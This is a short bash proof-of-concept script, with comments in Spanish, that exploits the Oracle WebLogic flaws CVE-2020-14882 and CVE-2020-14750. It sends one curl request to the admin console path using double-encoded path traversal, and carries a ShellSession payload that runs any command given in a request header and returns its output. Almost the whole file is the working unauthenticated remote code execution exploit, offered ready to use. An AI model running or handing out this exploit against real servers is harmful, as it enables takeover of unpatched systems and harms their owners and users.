#!/bin/bash

###################################################
# CVE-2020-14882                                  #
# CVE-2020-14750                                  #
# Autor: Pedro Prieto Sanchez                     #
# twitter: @PPrietoSanchez                        #
# PoC de la vulnerabilidad de Oracle Weblogic con #
# los codigos CVE anteriormente escritos          #
###################################################

if [ "$1" == "-h" ] || [ -z "$1" ] || [ -z "$2" ]; then
  echo "Modo de empleo: `basename $0` host:puerto comandoremoto
Intenta explotar las vulnerabilidades CVE-2020-14882 y CVE-2020-14750 en el host especificado ejecutando el comando especificado"
  exit 0
fi


host=$1
cmd=${@:2}

curl -k -s  -X POST \
    -H "Host: $host" -H "cmd: $cmd" \
    --data-binary $'\x0d\x0a_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();\x0d\x0aweblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();\x0d\x0ajava.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");\x0d\x0afield.setAccessible(true);\x0d\x0aObject obj = field.get(adapter);\x0d\x0aweblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"getServletRequest\").invoke(obj);\x0d\x0aString cmd = req.getHeader(\"cmd\");\x0d\x0aString[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};\x0d\x0aif (cmd != null) {\x0d\x0a    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\A\").next();\x0d\x0a    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(\"getResponse\").invoke(req);\x0d\x0a    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));\x0d\x0a    res.getServletOutputStream().flush();\x0d\x0a    res.getWriter().write(\"\");\x0d\x0a}executeThread.interrupt();\x0d\x0a\");' \
    "http://$host/console/css/%252e%252e%252fconsole.portal"
